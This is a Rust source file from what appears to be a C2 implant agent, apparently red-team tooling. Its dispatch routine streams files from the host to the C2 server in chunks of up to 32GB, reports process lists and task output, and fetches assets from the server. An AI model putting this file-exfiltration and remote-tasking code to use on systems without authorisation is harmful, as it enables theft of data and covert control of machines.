use anyhow::{anyhow, Result};
use pb::{
    c2::{FetchAssetRequest, ReportFileRequest, ReportProcessListRequest, TaskOutput, TaskError, ReportTaskOutputRequest},
    config::Config,
    eldritch::{File, FileMetadata, ProcessList},
};
use std::{io::Read, sync::mpsc::sync_channel};
use transport::Transport;

#[derive(Debug)]
pub enum ImixAction {
    ReportFile(i64, String),
    ReportProcessList(i64, ProcessList),
    ReportError(i64, String),
    ReportText(i64, String),
    FetchAsset(String, tokio::sync::oneshot::Sender<Result<Vec<u8>>>),
    #[allow(dead_code)]
    SetConfig(Config), // currently unused but might be used by AgentLibrary set_config in future
    Kill,
}

impl ImixAction {
    pub async fn dispatch(self, transport: &mut impl Transport, cfg: Config) -> Result<Config> {
        match self {
            ImixAction::ReportFile(task_id, path) => {
                // Configure Limits
                const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
                const MAX_CHUNKS_QUEUED: usize = 10; // 10 KB Limit (in channel)
                const MAX_FILE_SIZE: usize = 32 * 1024 * 1024 * 1024; // 32GB Limit (total file size)

                // Use a sync_channel to limit memory usage in case of network errors.
                let (tx, rx) = sync_channel(MAX_CHUNKS_QUEUED);

                // Spawn a new tokio task to read the file (in chunks)
                let path_clone = path.clone();
                tokio::spawn(async move {
                    let result = || -> Result<()> {
                        // Open file for reading
                        let mut f = std::fs::File::open(&path_clone)?;
                        let meta = f.metadata()?;

                        // Limit file sizes
                        if meta.len() > MAX_FILE_SIZE as u64 {
                            return Err(anyhow!("exceeded max file size"));
                        }

                        // Loop until we've finished reading the file
                        loop {
                            let mut buffer = [0; CHUNK_SIZE];
                            let n = f.read(&mut buffer[..])?;

                            #[cfg(debug_assertions)]
                            log::info!(
                                "reporting file chunk (task_id={}, size={})",
                                task_id,
                                buffer.len()
                            );

                            tx.send(ReportFileRequest {
                                task_id,
                                chunk: Some(File {
                                    metadata: Some(FileMetadata {
                                        path: path_clone.clone(),
                                        // TODO: File Metadata if needed
                                        owner: String::new(),
                                        group: String::new(),
                                        permissions: String::new(),
                                        size: 0,
                                        sha3_256_hash: String::new(),
                                    }),
                                    chunk: buffer[..n].to_vec(),
                                }),
                            })?;

                            if n < 1 {
                                break Ok(());
                            }
                        }
                    };

                    match result() {
                        Ok(_) => {}
                        Err(_err) => {
                            #[cfg(debug_assertions)]
                            log::error!("failed to report file: {}", _err);
                        }
                    }
                });

                transport.report_file(rx).await?;
                Ok(cfg)
            }
            ImixAction::ReportProcessList(task_id, list) => {
                transport
                    .report_process_list(ReportProcessListRequest {
                        task_id,
                        list: Some(list),
                    })
                    .await?;
                Ok(cfg)
            }
            ImixAction::ReportError(task_id, error) => {
                transport
                    .report_task_output(ReportTaskOutputRequest {
                        output: Some(TaskOutput {
                            id: task_id,
                            output: String::new(),
                            error: Some(TaskError { msg: error }),
                            exec_started_at: None,
                            exec_finished_at: None,
                        }),
                    })
                    .await?;
                Ok(cfg)
            }
            ImixAction::ReportText(task_id, text) => {
                transport
                    .report_task_output(ReportTaskOutputRequest {
                        output: Some(TaskOutput {
                            id: task_id,
                            output: text,
                            error: None,
                            exec_started_at: None, // timestamps could be added if needed
                            exec_finished_at: None,
                        }),
                    })
                    .await?;
                Ok(cfg)
            }
            ImixAction::FetchAsset(name, resp_tx) => {
                let (tx, rx) = std::sync::mpsc::channel();
                let _ = transport.fetch_asset(FetchAssetRequest {
                    name,
                }, tx).await;

                tokio::task::spawn_blocking(move || {
                    let mut data = Vec::new();
                    while let Ok(resp) = rx.recv() {
                         data.extend_from_slice(&resp.chunk);
                    }
                    let _ = resp_tx.send(Ok(data));
                });

                Ok(cfg)
            }
            ImixAction::SetConfig(new_cfg) => {
                // Update configuration
                Ok(new_cfg)
            }
            ImixAction::Kill => {
                 #[cfg(debug_assertions)]
                 log::warn!("Agent kill requested but not fully implemented");
                 Ok(cfg)
            }
        }
    }
}
